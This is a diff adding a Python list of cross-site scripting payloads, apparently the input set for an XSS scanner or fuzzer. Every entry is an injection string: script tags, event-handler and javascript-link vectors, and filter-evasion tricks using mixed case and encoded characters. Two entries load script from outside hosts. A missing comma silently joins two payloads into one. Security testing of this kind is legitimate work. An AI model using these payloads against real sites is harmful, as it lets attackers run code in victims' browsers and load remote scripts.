@@ -1,0 +1,31 @@
+# encoding=utf-8
+xsspayload=[
+    "<sCriPt>alert()</sCriPt>",
+    "<script src=http://ha.ckers.org/xss.js></script>",
+    "<script>alert(String.fromCharCode(88,83,83));</script>",
+    "<IMG \"\"\"><script>alert(\"XSS\")</script>\">",
+    "<img src=\"blah.jpg\" onerror=\"alert()\"/>",
+    "\"/><script>alert(1)</script>",
+    "\"\/><img src=\"blah.jpg\" onerror=\"alert()\"/>",
+    "\"\/><img src=\"blahjpg\" onerror=\"alert()\"/>"
+    "\"><script>alert(1)</script>",
+    "\"><img src=\"blah.jpg\" onerror=\"alert()\"/>",
+    "'><script>alert(1)</script>",
+    "\"><imG/sRc=l oNerrOr=(prompt)() x>",
+    "<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>",
+    "<deTails oNToggle=confi\u0072m()>",
+    "<A/iD=x hREf=javascript&colon;(prompt)&lpar;1&rpar; id=x>Click</A>",
+    "/\"><img sRc=l oNerrOr=prompt() x>",
+    "\"'><iMg sRc=x:confirm`` oNError=e\u0076al(src)>",
+    "\"><sCript x>confirm``</script x>",
+    "'\"><sVg/oNLoad=prompt()>",
+    "\"><sCriPt sRc=//14.rs>",
+    "\"'><iMg sRc=x:confirm`` oNError=eval(src)>",
+    "'\"><svG oNLoad=confirm&#x28;1&#x29>",
+    "'\">/*-/*`/*\`/*'/*\"/**/(/* */<sVg/OnloAd=prompt() x>",
+    "\"'--!><Script x>prompt()</scRiPt x>",
+    "'\"--!><sVg/oNLoad=confirm()><\"",
+    "\"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>",
+    "\"><img src=x onerror=co\u006efir\u006d`1`>",
+    "\"><svg/onload=co\u006efir\u006d`1`>"
+]
